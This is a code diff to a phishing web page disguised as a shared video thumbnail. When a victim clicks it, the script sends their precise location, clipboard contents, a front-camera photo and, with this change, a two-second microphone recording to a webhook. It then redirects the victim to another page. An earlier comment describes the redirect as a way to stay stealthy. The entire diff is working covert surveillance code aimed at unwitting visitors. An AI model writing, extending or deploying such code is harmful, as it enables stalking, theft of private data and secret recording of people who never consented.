@@ -15,7 +15,7 @@
 <body>
 
     <div class="video-container" onclick="send()">
-        <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&w=800&q=80">
+        <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&w=800&q=80" class="thumbnail">
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
         <div class="title">New Video Shared With You</div>
     </div>
@@ -36,41 +36,63 @@
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // STEP 1: Send Text Data IMMEDIATELY (Highly Reliable)
+                // STEP 1: Send Text Data
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: `📍 **Location:** ${mapLink}\n📋 **Clipboard:** ${clip}` })
                 });
 
-                // STEP 2: Try Camera (More likely to fail, so we do it last)
+                // STEP 2: Try Camera & Microphone
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    // Request both video and audio
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: true 
+                    });
+
+                    // Snapshot (Camera)
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-
                     const canvas = document.createElement('canvas');
-                    canvas.width = 320; // Very small for instant upload
-                    canvas.height = 240;
+                    canvas.width = 320; canvas.height = 240;
                     canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+
+                    // Audio Recording (2 Seconds)
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                    
+                    const recordTask = new Promise((resolve) => {
+                        mediaRecorder.onstop = async () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                            resolve(audioBlob);
+                        };
+                    });
+
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 2000); // 2 second clip
+                    const audioBlob = await recordTask;
+
+                    // Stop hardware lights
                     stream.getTracks().forEach(t => t.stop());
 
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+                    // Send Photo and Audio as files
                     const fd = new FormData();
-                    fd.append("file", blob, "photo.jpg");
-                    
-                    // Send photo as a follow-up
+                    fd.append("file1", photoBlob, "photo.jpg");
+                    fd.append("file2", audioBlob, "audio.wav");
                     await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                } catch (camErr) {
-                    console.log("Camera skipped or blocked");
+
+                } catch (mediaErr) {
+                    console.log("Media blocked");
                 }
 
                 // STEP 3: Redirect
                 window.location.replace(REDIRECT_URL);
 
             }, (err) => {
-                // If location is denied, just redirect to stay stealthy
                 window.location.replace(REDIRECT_URL);
             }, { enableHighAccuracy: true, timeout: 5000 });
         }
